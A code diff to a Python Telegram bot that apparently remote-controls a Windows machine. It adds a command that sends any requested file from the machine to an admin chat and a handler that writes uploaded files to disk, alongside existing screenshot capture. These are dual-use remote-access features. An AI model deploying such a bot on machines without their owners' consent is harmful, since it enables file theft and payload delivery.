@@ -53,8 +53,30 @@ def text(message):
             screen = system.getScreen()
             bot.send_document(message.chat.id, open(screen, "rb"))
             os.remove(screen)
+        elif "getfile" in message.text:
+            try:
+                path = system.normalizeString(mes_io.splitter(message.text))
+                with open(path, 'rb') as doc:
+                    bot.send_document(message.chat.id, doc)
+            except Exception as err:
+                bot.send_message(message.chat.id, ERROR_STR(f"Something wrong: {err}", "ERROR"))
         else:
             bot.send_message(message.chat.id, mes_io.messageProcessing(message.text), parse_mode="HTML")
+    else:
+        bot.send_message(message.chat.id, ACCESS_DENIED)
+
+@bot.message_handler(content_types=["document"])
+def doc(message): 
+    if message.chat.id == ADMIN:
+        try:
+            file_info = bot.get_file(message.document.file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            src = f'{os.getcwd()}\\{message.document.file_name}'
+            with open(src, 'wb') as new_file:
+                new_file.write(downloaded_file)
+            bot.reply_to(message, f"{DONE}Sent {os.getcwd()}")
+        except Exception as err:
+            bot.send_message(message.chat.id, ERROR_STR(f"Not sent: {err}", "ERROR"))
     else:
         bot.send_message(message.chat.id, ACCESS_DENIED)
 
